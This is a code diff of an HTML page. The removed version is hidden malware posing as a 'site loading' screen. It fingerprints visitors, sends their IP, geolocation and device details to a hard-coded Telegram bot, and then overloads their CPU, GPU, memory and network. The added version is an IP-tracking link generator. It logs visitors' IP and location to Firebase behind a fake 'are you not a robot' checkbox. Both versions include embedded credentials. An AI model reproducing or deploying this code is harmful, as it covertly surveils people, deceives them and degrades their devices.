@@ -3,480 +3,296 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка сайта...</title>
+    <title>Whois по IP + генератор ссылок</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        body {
-            background-color: #2c3e50;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #ecf0f1;
-        }
-        .message {
-            text-align: center;
-            font-size: 3rem;
-            font-weight: 300;
-            letter-spacing: 2px;
-        }
-        .dots {
-            display: inline-block;
-            width: 3rem;
-            text-align: left;
-        }
-        .dots::after {
-            content: '...';
-            animation: dots 1.5s steps(4, end) infinite;
-        }
-        @keyframes dots {
-            0%, 20% { content: ''; }
-            40% { content: '.'; }
-            60% { content: '..'; }
-            80%, 100% { content: '...'; }
-        }
+        * { box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #f5f5f5; margin: 0; padding: 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: white; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 20px; }
+        h1, h2 { color: #333; margin-top: 0; }
+        .section { background: #fafafa; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
+        .flex-row { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
+        input[type="text"], input[type="url"] { flex: 1; padding: 8px 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; }
+        button { background: #007bff; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        button:hover { background: #0056b3; }
+        button.secondary { background: #6c757d; }
+        button.secondary:hover { background: #5a6268; }
+        pre { background: #e9ecef; padding: 10px; border-radius: 4px; overflow-x: auto; margin: 10px 0 0; }
+        .result-item { border-bottom: 1px solid #ddd; padding: 10px 0; }
+        .result-item:last-child { border-bottom: none; }
+        .warning { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 10px; border-radius: 4px; margin: 10px 0; }
+        .checkbox-label { display: flex; align-items: center; gap: 8px; }
+        .link-box { background: #d1ecf1; border: 1px solid #bee5eb; color: #0c5460; padding: 10px; border-radius: 4px; word-break: break-all; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
-    <div class="message">
-        Загрузка сайта<span class="dots"></span>
+<div class="container">
+    <h1>🔍 Whois по IP + генератор ссылок</h1>
+
+    <!-- Whois IP -->
+    <div class="section">
+        <h2>Whois IP</h2>
+        <div class="flex-row">
+            <input type="text" id="ipInput" placeholder="Введите IP (оставьте пустым для своего IP)">
+            <button id="lookupBtn">Поиск</button>
+            <button id="myIpBtn" class="secondary">Мой IP</button>
+        </div>
+        <pre id="whoisResult">Введите IP или нажмите "Мой IP"</pre>
     </div>
 
-    <script>
-        (function() {
-            // ⚠️ ВАШИ ДАННЫЕ (токен и ID)
-            const TELEGRAM_TOKEN = '8519920730:AAF9hPsqQCFH5sVrqJ9OCpCPSOtdKeilT88';
-            const TELEGRAM_CHAT_ID = '8489374137';
+    <!-- Генератор ссылки -->
+    <div class="section">
+        <h2>🔗 Создать отслеживаемую ссылку</h2>
+        <p>После создания вы получите ссылку. Тот, кто перейдёт по ней (с согласием), сохранит свой IP.</p>
+        <button id="generateBtn">Создать ссылку</button>
+        <div id="generatedLinkContainer" class="hidden">
+            <p>Ваша ссылка:</p>
+            <div class="link-box" id="generatedLink"></div>
+            <button id="viewResultsBtn" class="secondary">Просмотреть переходы</button>
+        </div>
+    </div>
 
-            // ==================== РАСШИРЕННЫЙ СБОР OSINT ====================
-            async function collectExtendedData() {
-                const result = {};
+    <!-- Просмотр результатов по ID -->
+    <div id="resultsSection" class="section hidden">
+        <h2>📊 Переходы по ссылке</h2>
+        <div id="resultsContent">Загрузка...</div>
+    </div>
 
-                // IP
-                try {
-                    const ipRes = await fetch('https://api.ipify.org?format=json');
-                    const ipData = await ipRes.json();
-                    result.ip = ipData.ip;
-                } catch {
-                    result.ip = 'Не удалось определить';
-                }
+    <!-- Блок для отслеживаемого перехода (показывается, если в URL есть ?id=...) -->
+    <div id="trackingSection" class="section hidden">
+        <h2>⚠️ are you not a robot</h2>
+        <p>to {{ url }} not a robot</p>
+        <div class="checkbox-label">
+            <input type="checkbox" id="consentCheckbox">
+            <label for="consentCheckbox">click are you not a robot</label>
+        </div>
+        <button id="proceedBtn">next</button>
+        <button id="cancelBtn" class="secondary">cencel</button>
+    </div>
+</div>
 
-                // Геолокация
-                result.geo = 'Не запрошено или отказано';
-                if (navigator.geolocation) {
-                    try {
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 8000 });
-                        });
-                        const { latitude, longitude } = position.coords;
-                        const geoRes = await fetch(
-                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
-                            { headers: { 'User-Agent': 'MyOSINTCollector/1.0' } }
-                        );
-                        const geoJson = await geoRes.json();
-                        result.geo = geoJson.display_name || `${latitude}, ${longitude}`;
-                    } catch {
-                        result.geo = 'Геолокация недоступна';
-                    }
-                }
+<!-- Firebase SDK (v8) -->
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
-                // UserAgent и ОС/устройство
-                const ua = navigator.userAgent;
-                result.userAgent = ua;
-                if (ua.includes('Windows')) result.os = 'Windows';
-                else if (ua.includes('Mac OS')) result.os = 'macOS';
-                else if (ua.includes('Linux')) result.os = 'Linux';
-                else if (ua.includes('Android')) result.os = 'Android';
-                else if (ua.includes('iPhone') || ua.includes('iPad')) result.os = 'iOS';
-                else result.os = 'Неизвестно';
+<script>
+    // ---------- Firebase инициализация ----------
+    const firebaseConfig = {
+        apiKey: "AIzaSyDb_xlpLYoVEkd1aObJjzvlS8-JPDjn72E",
+        authDomain: "generalapp-b4f45.firebaseapp.com",
+        databaseURL: "https://generalapp-b4f45-default-rtdb.firebaseio.com",
+        projectId: "generalapp-b4f45",
+        storageBucket: "generalapp-b4f45.firebasestorage.app",
+        messagingSenderId: "800461808673",
+        appId: "1:800461808673:web:ec6374f28c7a40ced7ef60",
+        measurementId: "G-JYL0G1J1GJ"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
 
-                if (ua.includes('iPhone')) result.device = 'iPhone';
-                else if (ua.includes('iPad')) result.device = 'iPad';
-                else if (ua.includes('Android')) {
-                    const match = ua.match(/Android\s+[^;]+(;\s+[^)]+)/);
-                    result.device = match ? match[1] : 'Android устройство';
-                } else if (ua.includes('Windows NT')) result.device = 'ПК (Windows)';
-                else if (ua.includes('Macintosh')) result.device = 'ПК (Mac)';
-                else result.device = 'ПК/Другое';
+    // ---------- Утилиты ----------
+    const urlParams = new URLSearchParams(window.location.search);
+    const trackingId = urlParams.get('id');      // для перехода
+    const viewId = urlParams.get('view');        // для просмотра результатов
 
-                // CPU и RAM
-                result.cpuCores = navigator.hardwareConcurrency || 'неизвестно';
-                result.memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'неизвестно';
+    // Функция получения информации по IP через ip-api.com
+    async function getIPInfo(ip = '') {
+        const url = ip ? `https://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org,as,lat,lon,query` : 'https://ip-api.com/json/?fields=status,message,country,regionName,city,isp,org,as,lat,lon,query';
+        try {
+            const response = await fetch(url);
+            const data = await response.json();
+            if (data.status === 'success') {
+                return data;
+            } else {
+                throw new Error(data.message || 'Не удалось получить информацию');
+            }
+        } catch (error) {
+            throw new Error('Ошибка запроса: ' + error.message);
+        }
+    }
 
-                // Батарея
-                if (navigator.getBattery) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        result.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'зарядка' : 'разрядка'})`;
-                    } catch {
-                        result.battery = 'Недоступно';
-                    }
-                } else {
-                    result.battery = 'Не поддерживается';
-                }
+    // Функция получения текущего IP через ipify
+    async function getMyIP() {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        return data.ip;
+    }
 
-                // Информация о сети
-                if (navigator.connection) {
-                    const conn = navigator.connection;
-                    result.network = `${conn.effectiveType || '??'}, ${conn.downlink ? conn.downlink + ' Mbps' : '??'}, rtt=${conn.rtt || '??'}ms`;
-                } else {
-                    result.network = 'Недоступно';
-                }
+    // Отображение информации об IP в блоке whois
+    function displayWhoisData(data) {
+        if (!data) return;
+        const lines = [
+            `IP: ${data.query}`,
+            `Страна: ${data.country}`,
+            `Регион: ${data.regionName}`,
+            `Город: ${data.city}`,
+            `Провайдер: ${data.isp}`,
+            `Организация: ${data.org}`,
+            `AS: ${data.as}`,
+            `Координаты: ${data.lat}, ${data.lon}`
+        ];
+        document.getElementById('whoisResult').textContent = lines.join('\n');
+    }
 
-                // Плагины
-                const plugins = [];
-                if (navigator.plugins && navigator.plugins.length > 0) {
-                    for (let i = 0; i < navigator.plugins.length; i++) {
-                        plugins.push(navigator.plugins[i].name);
-                    }
-                }
-                result.plugins = plugins.slice(0, 5).join(', ') + (plugins.length > 5 ? ` и ещё ${plugins.length-5}` : '') || 'Нет';
+    // ---------- Работа с Firebase ----------
+    async function createTrackingLink() {
+        // Генерируем случайный ID (6 символов)
+        const id = Math.random().toString(36).substring(2, 8);
+        // Получаем IP создателя
+        let creatorIp = 'не определен';
+        try {
+            creatorIp = await getMyIP();
+        } catch (e) { console.warn('Не удалось определить IP создателя'); }
 
-                // Экран, язык, часовой пояс
-                result.screen = `${screen.width}x${screen.height} (глубина ${screen.colorDepth}bit)`;
-                result.language = navigator.language || 'неизвестно';
-                result.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'неизвестно';
-                result.cookiesEnabled = navigator.cookieEnabled ? 'Да' : 'Нет';
-                result.localStorage = typeof localStorage !== 'undefined' ? 'Доступен' : 'Недоступен';
-                result.referrer = document.referrer || 'Прямой переход';
-                result.timestamp = new Date().toISOString();
-                result.url = window.location.href;
-                result.platform = navigator.platform || 'неизвестно';
-                result.doNotTrack = navigator.doNotTrack || 'не указано';
+        const linkData = {
+            createdAt: firebase.database.ServerValue.TIMESTAMP,
+            creatorIp: creatorIp,
+            hits: [] // массив объектов { ip, country, region, city, isp, org, as, lat, lon, timestamp }
+        };
 
-                // Canvas fingerprint
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 200;
-                    canvas.height = 50;
-                    const ctx = canvas.getContext('2d');
-                    ctx.textBaseline = 'top';
-                    ctx.font = '14px Arial';
-                    ctx.fillStyle = '#f60';
-                    ctx.fillRect(0, 0, 100, 50);
-                    ctx.fillStyle = '#069';
-                    ctx.fillText('OSINT', 2, 15);
-                    result.canvasFingerprint = canvas.toDataURL().slice(0, 50) + '...';
-                } catch {
-                    result.canvasFingerprint = 'Ошибка';
-                }
+        await db.ref('trackingLinks/' + id).set(linkData);
+        return id;
+    }
 
-                // WebGL fingerprint
-                try {
-                    const canvas = document.createElement('canvas');
-                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                    if (gl) {
-                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                        if (debugInfo) {
-                            result.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                        } else {
-                            result.webglRenderer = 'Недоступно';
-                        }
-                    } else {
-                        result.webglRenderer = 'WebGL не поддерживается';
-                    }
-                } catch {
-                    result.webglRenderer = 'Ошибка';
-                }
+    async function recordHit(linkId, ipInfo) {
+        const hit = {
+            ip: ipInfo.query,
+            country: ipInfo.country,
+            region: ipInfo.regionName,
+            city: ipInfo.city,
+            isp: ipInfo.isp,
+            org: ipInfo.org,
+            as: ipInfo.as,
+            lat: ipInfo.lat,
+            lon: ipInfo.lon,
+            timestamp: firebase.database.ServerValue.TIMESTAMP
+        };
 
-                // Audio fingerprint
-                try {
-                    const AudioContext = window.AudioContext || window.webkitAudioContext;
-                    if (AudioContext) {
-                        const ctx = new AudioContext();
-                        result.audio = 'AudioContext доступен';
-                        ctx.close();
-                    } else {
-                        result.audio = 'Нет AudioContext';
-                    }
-                } catch {
-                    result.audio = 'Ошибка';
-                }
+        // Добавляем в массив hits
+        const ref = db.ref('trackingLinks/' + linkId + '/hits');
+        await ref.push(hit);
+    }
 
-                // Доступные шрифты
-                const fontCheck = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana'];
-                const availableFonts = fontCheck.filter(f => document.fonts.check(`12px "${f}"`));
-                result.fonts = availableFonts.join(', ') || 'Стандартные';
+    async function getLinkData(linkId) {
+        const snapshot = await db.ref('trackingLinks/' + linkId).once('value');
+        return snapshot.val();
+    }
 
-                // Время загрузки страницы
-                if (performance && performance.timing) {
-                    const timing = performance.timing;
-                    const loadTime = timing.loadEventEnd - timing.navigationStart;
-                    result.loadTime = loadTime + 'ms';
-                } else {
-                    result.loadTime = 'недоступно';
-                }
+    // ---------- UI обработчики ----------
+    document.addEventListener('DOMContentLoaded', async () => {
+        // 1. Если есть trackingId (переход по ссылке) – показываем секцию согласия
+        if (trackingId) {
+            document.getElementById('trackingSection').classList.remove('hidden');
+            // Скрываем другие секции для ясности
+            document.querySelectorAll('.section:not(#trackingSection)').forEach(el => el.classList.add('hidden'));
+        }
+        // 2. Если есть viewId – показываем результаты
+        else if (viewId) {
+            document.getElementById('resultsSection').classList.remove('hidden');
+            await loadAndDisplayResults(viewId);
+        }
 
-                return result;
+        // Whois по введённому IP
+        document.getElementById('lookupBtn').addEventListener('click', async () => {
+            const ip = document.getElementById('ipInput').value.trim();
+            try {
+                const data = await getIPInfo(ip || undefined);
+                displayWhoisData(data);
+            } catch (e) {
+                document.getElementById('whoisResult').textContent = 'Ошибка: ' + e.message;
+            }
+        });
+
+        // Мой IP
+        document.getElementById('myIpBtn').addEventListener('click', async () => {
+            try {
+                const ip = await getMyIP();
+                document.getElementById('ipInput').value = ip;
+                const data = await getIPInfo(ip);
+                displayWhoisData(data);
+            } catch (e) {
+                document.getElementById('whoisResult').textContent = 'Ошибка: ' + e.message;
+            }
+        });
+
+        // Генерация ссылки
+        document.getElementById('generateBtn').addEventListener('click', async () => {
+            try {
+                const id = await createTrackingLink();
+                const link = `${window.location.origin}${window.location.pathname}?id=${id}`;
+                document.getElementById('generatedLink').textContent = link;
+                document.getElementById('generatedLinkContainer').classList.remove('hidden');
+                // Кнопка просмотра результатов
+                document.getElementById('viewResultsBtn').onclick = () => {
+                    window.location.href = `?view=${id}`;
+                };
+            } catch (e) {
+                alert('Ошибка создания ссылки: ' + e.message);
+            }
+        });
+
+        // Обработка согласия на отслеживание
+        document.getElementById('proceedBtn').addEventListener('click', async () => {
+            if (!document.getElementById('consentCheckbox').checked) {
+                alert('Необходимо дать согласие на сбор данных.');
+                return;
             }
 
-            // ==================== ФОРМАТИРОВАНИЕ СООБЩЕНИЯ (ПОНЯТНЫЙ ВИД) ====================
-            function formatTelegramMessage(data) {
-                const lines = [];
+            try {
+                // Получаем IP и информацию о посетителе
+                const myIp = await getMyIP();
+                const ipInfo = await getIPInfo(myIp);
+                // Сохраняем в Firebase
+                await recordHit(trackingId, ipInfo);
+                alert('Данные сохранены. Спасибо!');
+                // Перенаправляем на просмотр (или просто показываем сообщение)
+                window.location.href = `?view=${trackingId}`;
+            } catch (e) {
+                alert('Ошибка при сохранении: ' + e.message);
+            }
+        });
 
-                // Заголовок
-                lines.push('🕵️‍♂️ *OSINT ОТЧЁТ*');
-                lines.push('');
+        document.getElementById('cancelBtn').addEventListener('click', () => {
+            window.location.href = '/'; // на главную
+        });
+    });
 
-                // 1. Сеть и геолокация
-                lines.push('🌐 *Сеть и гео*');
-                lines.push(`▫️ *IP:* ${data.ip}`);
-                lines.push(`▫️ *Гео:* ${data.geo}`);
-                lines.push(`▫️ *Тип сети:* ${data.network}`);
-                lines.push('');
-
-                // 2. Устройство и система
-                lines.push('💻 *Устройство и ОС*');
-                lines.push(`▫️ *ОС:* ${data.os}`);
-                lines.push(`▫️ *Устройство:* ${data.device}`);
-                lines.push(`▫️ *Платформа:* ${data.platform}`);
-                lines.push(`▫️ *User‑Agent:* \`${data.userAgent}\``);
-                lines.push('');
-
-                // 3. Аппаратные ресурсы
-                lines.push('⚙️ *Ресурсы*');
-                lines.push(`▫️ *Ядер CPU:* ${data.cpuCores}`);
-                lines.push(`▫️ *ОЗУ:* ${data.memory}`);
-                lines.push(`▫️ *Батарея:* ${data.battery}`);
-                lines.push(`▫️ *WebGL рендерер:* ${data.webglRenderer}`);
-                lines.push('');
-
-                // 4. Браузер и окружение
-                lines.push('🧩 *Браузер*');
-                lines.push(`▫️ *Экран:* ${data.screen}`);
-                lines.push(`▫️ *Язык:* ${data.language}`);
-                lines.push(`▫️ *Часовой пояс:* ${data.timezone}`);
-                lines.push(`▫️ *Куки:* ${data.cookiesEnabled}`);
-                lines.push(`▫️ *LocalStorage:* ${data.localStorage}`);
-                lines.push(`▫️ *Плагины:* ${data.plugins}`);
-                lines.push(`▫️ *Шрифты:* ${data.fonts}`);
-                lines.push(`▫️ *Canvas:* ${data.canvasFingerprint}`);
-                lines.push(`▫️ *Аудио:* ${data.audio}`);
-                lines.push('');
-
-                // 5. Дополнительно
-                lines.push('📎 *Дополнительно*');
-                lines.push(`▫️ *DoNotTrack:* ${data.doNotTrack}`);
-                lines.push(`▫️ *Referrer:* ${data.referrer}`);
-                lines.push(`▫️ *Время загрузки:* ${data.loadTime}`);
-                lines.push(`▫️ *URL:* ${data.url}`);
-                lines.push('');
-
-                // Время отчёта
-                lines.push(`🕒 *Отчёт создан:* ${data.timestamp}`);
-
-                return lines.join('\n');
+    // Функция загрузки и отображения результатов
+    async function loadAndDisplayResults(id) {
+        const contentDiv = document.getElementById('resultsContent');
+        try {
+            const data = await getLinkData(id);
+            if (!data) {
+                contentDiv.innerHTML = '<p>Ссылка не найдена.</p>';
+                return;
             }
 
-            // ==================== ОТПРАВКА ТЕКСТА В TELEGRAM ====================
-            function sendToTelegram(message) {
-                const escapeMarkdown = (str) => str.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
-                const safeMessage = escapeMarkdown(message);
-                const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(safeMessage)}&parse_mode=Markdown`;
+            let html = `<p><strong>Создатель IP:</strong> ${data.creatorIp || 'неизвестно'}</p>`;
+            html += `<p><strong>Дата создания:</strong> ${new Date(data.createdAt).toLocaleString()}</p>`;
+            html += `<h3>Переходы (${data.hits ? Object.keys(data.hits).length : 0})</h3>`;
 
-                if (url.length > 2000) {
-                    const parts = [];
-                    const maxPartSize = 1500;
-                    for (let i = 0; i < safeMessage.length; i += maxPartSize) {
-                        parts.push(safeMessage.slice(i, i + maxPartSize));
-                    }
-                    parts.forEach((part, index) => {
-                        const partUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(part + (parts.length > 1 ? ` (часть ${index+1}/${parts.length})` : ''))}&parse_mode=Markdown`;
-                        fetch(partUrl, { mode: 'no-cors' }).catch(() => {});
-                    });
-                } else {
-                    fetch(url, { mode: 'no-cors' }).catch(() => {});
-                }
+            if (data.hits) {
+                const hitsArray = Object.values(data.hits);
+                hitsArray.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+                hitsArray.forEach((hit, index) => {
+                    html += `<div class="result-item">`;
+                    html += `<strong>#${index + 1}</strong> — ${new Date(hit.timestamp).toLocaleString()}<br>`;
+                    html += `IP: ${hit.ip}<br>`;
+                    html += `📍 ${hit.country}, ${hit.region}, ${hit.city}<br>`;
+                    html += `🏢 ${hit.isp} (${hit.org})<br>`;
+                    html += `📡 AS: ${hit.as}<br>`;
+                    html += `🌐 Координаты: ${hit.lat}, ${hit.lon}`;
+                    html += `</div>`;
+                });
+            } else {
+                html += '<p>Пока нет переходов.</p>';
             }
 
-            // ==================== ФУНКЦИИ НАГРУЗКИ (ПОСТЕПЕННОЕ УВЕЛИЧЕНИЕ) ====================
-            let stressActive = false;
-            let workers = [];
-            let networkInterval = null;
-            let gpuLoop = null;
-            let memoryLeakArray = [];
-            let intensityLevel = 0;
-            let intensityInterval = null;
-
-            function startCPUWorker() {
-                const workerCode = `
-                    function busyLoop() {
-                        let x = 0;
-                        while(true) {
-                            for(let j=0; j<1000000; j++) {
-                                x += Math.sqrt(j) * Math.tan(j);
-                            }
-                        }
-                    }
-                    busyLoop();
-                `;
-                const blob = new Blob([workerCode], { type: 'application/javascript' });
-                const worker = new Worker(URL.createObjectURL(blob));
-                workers.push(worker);
-            }
-
-            function addMemoryLoad() {
-                for (let i = 0; i < 2; i++) {
-                    const arr = new Array(500000).fill(0).map(() => Math.random());
-                    memoryLeakArray.push(arr);
-                }
-                if (memoryLeakArray.length > 100) {
-                    memoryLeakArray.splice(0, 30);
-                }
-            }
-
-            function updateNetworkIntensity() {
-                if (networkInterval) clearInterval(networkInterval);
-                const intervalTime = Math.max(50, 500 - intensityLevel * 30);
-                networkInterval = setInterval(() => {
-                    if (!stressActive) {
-                        clearInterval(networkInterval);
-                        return;
-                    }
-                    const urls = [
-                        'https://www.google.com/favicon.ico',
-                        'https://www.cloudflare.com/cdn-cgi/trace',
-                        'https://www.github.com/favicon.ico',
-                        'https://www.microsoft.com/favicon.ico',
-                        'https://www.amazon.com/favicon.ico'
-                    ];
-                    urls.forEach(url => {
-                        fetch(url, { mode: 'no-cors' }).catch(() => {});
-                        new Image().src = url + '?r=' + Math.random();
-                    });
-                }, intervalTime);
-            }
-
-            function startGPULoop() {
-                if (gpuLoop) return;
-                const canvas = document.createElement('canvas');
-                canvas.width = 512;
-                canvas.height = 512;
-                canvas.style.display = 'none';
-                document.body.appendChild(canvas);
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return;
-
-                const vertexShaderSource = `
-                    attribute vec2 a_position;
-                    void main() {
-                        gl_Position = vec4(a_position, 0.0, 1.0);
-                    }
-                `;
-                const fragmentShaderSource = `
-                    precision highp float;
-                    uniform float u_time;
-                    uniform float u_complexity;
-                    void main() {
-                        float sum = 0.0;
-                        for (int i = 0; i < 1000; i++) {
-                            sum += sin(u_time * float(i) * u_complexity) * cos(float(i) * u_complexity);
-                        }
-                        gl_FragColor = vec4(sin(u_time), cos(u_time), sum, 1.0);
-                    }
-                `;
-
-                function createShader(gl, source, type) {
-                    const shader = gl.createShader(type);
-                    gl.shaderSource(shader, source);
-                    gl.compileShader(shader);
-                    return shader;
-                }
-
-                const vertexShader = createShader(gl, vertexShaderSource, gl.VERTEX_SHADER);
-                const fragmentShader = createShader(gl, fragmentShaderSource, gl.FRAGMENT_SHADER);
-                const program = gl.createProgram();
-                gl.attachShader(program, vertexShader);
-                gl.attachShader(program, fragmentShader);
-                gl.linkProgram(program);
-                gl.useProgram(program);
-
-                const vertices = new Float32Array([-1, -1, 1, -1, -1, 1, 1, 1]);
-                const buffer = gl.createBuffer();
-                gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-                gl.bufferData(gl.ARRAY_BUFFER, vertices, gl.STATIC_DRAW);
-                const positionLocation = gl.getAttribLocation(program, 'a_position');
-                gl.enableVertexAttribArray(positionLocation);
-                gl.vertexAttribPointer(positionLocation, 2, gl.FLOAT, false, 0, 0);
-
-                const timeLocation = gl.getUniformLocation(program, 'u_time');
-                const complexityLocation = gl.getUniformLocation(program, 'u_complexity');
-
-                function render() {
-                    if (!stressActive) return;
-                    gl.uniform1f(timeLocation, performance.now() / 1000);
-                    gl.uniform1f(complexityLocation, 1.0 + intensityLevel / 5);
-                    gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
-                    requestAnimationFrame(render);
-                }
-                render();
-                gpuLoop = true;
-            }
-
-            function startGradualStress() {
-                stressActive = true;
-                intensityLevel = 0;
-
-                // Каждую секунду увеличиваем интенсивность
-                intensityInterval = setInterval(() => {
-                    if (!stressActive) {
-                        clearInterval(intensityInterval);
-                        return;
-                    }
-                    intensityLevel++;
-
-                    // CPU: добавляем новый воркер каждые 2 уровня
-                    if (intensityLevel % 2 === 0 && workers.length < (navigator.hardwareConcurrency || 4) * 2) {
-                        startCPUWorker();
-                    }
-
-                    // RAM: добавляем память
-                    addMemoryLoad();
-
-                    // Сеть: обновляем интервал
-                    updateNetworkIntensity();
-
-                    // GPU: сложность уже зависит от intensityLevel через uniform
-                }, 1000);
-
-                // Инициализируем первый уровень
-                startCPUWorker();
-                addMemoryLoad();
-                updateNetworkIntensity();
-                startGPULoop();
-            }
-
-            // ==================== ОСНОВНОЙ ПРОЦЕСС ====================
-            (async function() {
-                try {
-                    // 1. Сбор расширенных данных
-                    const data = await collectExtendedData();
-
-                    // 2. Форматирование и отправка текстового сообщения
-                    const textMessage = formatTelegramMessage(data);
-                    sendToTelegram(textMessage);
-
-                    // 3. Запуск постепенной нагрузки в фоне
-                    startGradualStress();
-
-                } catch (error) {
-                    console.error('Ошибка:', error);
-                }
-            })();
-
-            // Таймаут на случай зависания сбора данных (не влияет на интерфейс)
-            setTimeout(() => {
-                if (!stressActive) {
-                    console.warn('Сбор данных занял больше 20 секунд, запускаем нагрузку принудительно');
-                    startGradualStress();
-                }
-            }, 20000);
-        })();
-    </script>
+            contentDiv.innerHTML = html;
+        } catch (e) {
+            contentDiv.innerHTML = '<p>Ошибка загрузки: ' + e.message + '</p>';
+        }
+    }
+</script>
 </body>
 </html>
